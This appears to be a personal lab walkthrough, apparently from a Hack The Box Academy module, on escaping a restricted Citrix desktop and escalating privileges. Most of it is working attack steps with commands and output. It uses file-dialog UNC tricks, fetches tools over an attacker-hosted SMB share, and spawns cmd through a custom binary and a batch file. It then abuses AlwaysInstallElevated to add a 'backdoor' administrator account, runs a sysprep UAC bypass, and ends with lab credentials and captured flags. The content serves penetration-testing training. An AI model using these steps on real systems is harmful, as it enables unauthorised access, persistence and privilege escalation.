# Citrix Breakout

Basic Methodology for break-out:

1. Gain access to a Dialog Box.
2. Exploit the Dialog Box to achieve command execution.
3. Escalate privileges to gain higher levels of access.

## 1 & 2

### Bypassing Path Restrictions

1) Open one desktop application (Paint, Notepad, Wordpad, MS Paint)

2) Click on File > Open to open the Dialog Box

3) Set File-Type to All Files and enter the UNC path \\127.0.0.1\c$\users\pmorgan into File Name

### Accessing SMB share from restricted environment

1) Start a SMB server from the attacker machine using Impacket's smbserver.py script

```
smbserver.py -smb2support share $(pwd)

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

2) Open one desktop application (Paint, Notepad, Wordpad, MS Paint)

3) Click on File > Open to open the Dialog Box

4) Set File-Type to All Files and enter the UNC path \\10.13.38.95\share into File Name

--> Due to the presence of restrictions within the File Explorer, direct file copying is not viable.

Right-clicking on the executables and subsequently launching them

The executable pwn.exe is a custom compiled binary from pwn.c file which upon execution opens up the cmd.

```
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

### Alternate Explorer

Editors like Q-Dir or Explorer++ can be employed as a workaround.

Through the utilization of Explorer++, the capability to copy files from the \\10.13.38.95\share location to the Desktop belonging to the user pmorgan has been successfully 

Highly recommended !!! : https://explorerplusplus.com/
--> executed directly without the need for installation : convenient choice for bypassing folder restrictions set by group policy

### Alternate Registry Editors

https://sourceforge.net/projects/simpregedit/
https://sourceforge.net/projects/uberregedit/
https://sourceforge.net/projects/sre/

--> These tools offer a practical and effective solution for managing registry settings in such restricted environments.

### Modify existing shortcut file

1) Right-click the desired shortcut.

2) Select Properties.

3) Within the Target field, modify the path to the intended folder for access.

C:\Windows\System32\cmd.exe

4) Execute the Shortcut and cmd will be spawned

Other option is to transfer an existing shortcut file using an SMB server

### Script Execution

1) Create a new text file and name it "evil.bat".

2) Open "evil.bat" with a text editor such as Notepad.

3) Input the command "cmd" into the file.

4) Save the file.

--> Upon executing the "evil.bat" file, it will initiate a Command Prompt window.

## 3 : Escalating Privileges

https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1

Using PowerUp.ps1, we find that Always Install Elevated key is present and set.

1) Validate the presence and the setting of registry key using CMD

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1
```

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1
```

2) Create an .msi file directly on the desktop

```
Import-Module .\PowerUp.ps1
Write-UserAddMSI
	
Output Path
-----------
UserAdd.msi
```

3) UserAdd.msi and create a new user backdoor:T3st@123 under Administrators group

--> Giving it a password that doesn’t meet the password complexity criteria will throw an error

4) Start a CMD as the newly backdoor user

```
runas /user:backdoor cmd

Enter the password for backdoor: T3st@123
Attempting to start cmd as user "VDESKTOP3\backdoor" ...
```

### Bypassing UAC

```
C:\Windows\system32> cd C:\Users\Administrator

Access is denied.
```

https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC

```
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

--> A new powershell windows will be opened with higher privileges and we can confirm it by utilizing the command whoami /all or whoami /priv

Addditional resources worth checking:
https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/
https://node-security.com/posts/breaking-out-of-windows-environments/

## LAB

xfreerdp /v:10.129.205.244 /u:htb-student /p:HTB_@cademy_stdnt!

http://humongousretail.com/remote/

Username: pmorgan
Password: Summer1Summer!
  Domain: htb.local

1) Open one desktop application (Paint, Notepad, Wordpad, MS Paint)

2) Click on File > Open to open the Dialog Box

3) Set File-Type to All Files and enter the UNC path \\127.0.0.1\c$\Users\pmorgan\Downloads

flag.txt
CitR1X_Us3R_Esc@p3

sudo smbserver.py -smb2support share $(pwd)
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

\\10.10.15.97\share

--> no response

1) Create a new text file and name it "evil.bat".

2) Open "evil.bat" with a text editor such as Notepad.

3) Input the command "cmd" into the file.

4) Save the file.

--> Upon executing the "evil.bat" file, it will initiate a Command Prompt window.

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1

    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1

--> need PowerUp.ps1 to escalate priivileges

htb-student@ubuntu:~/Tools$ dir
Bypass-UAC.ps1	Explorer++.exe	PowerUp.ps1  pwn.c  pwn.exe

htb-student@ubuntu:~/Tools$ sudo /home/htb-student/.local/bin/smbserver.py -smb2support share $(pwd)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

\\10.13.38.95\share

cd c:\Users\pmorgan\Desktop

powershell -ep bypass

xcopy \\10.13.38.95\share\Bypass-UAC.ps1 .
xcopy \\10.13.38.95\share\PowerUp.ps1 .

Import-Module .\PowerUp.ps1
Write-UserAddMSI
.\UserAdd.msi

backdoor:T3st@123

runas /user:backdoor cmd
T3st@123

c:\Windows\System32> type  C:\Users\Administrator\Desktop\flag.txt
Access is denied

powershell -ep bypass

cd c:\Users\Public

xcopy \\10.13.38.95\share\Bypass-UAC.ps1 .

Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep

type  C:\Users\Administrator\Desktop\flag.txt > c:\Users\pmorgan\Desktop\flag_adm.txt

\\127.0.0.1\c$\Users\pmorgan\Desktop\

c1tr!x_3sc@p3_@dm!n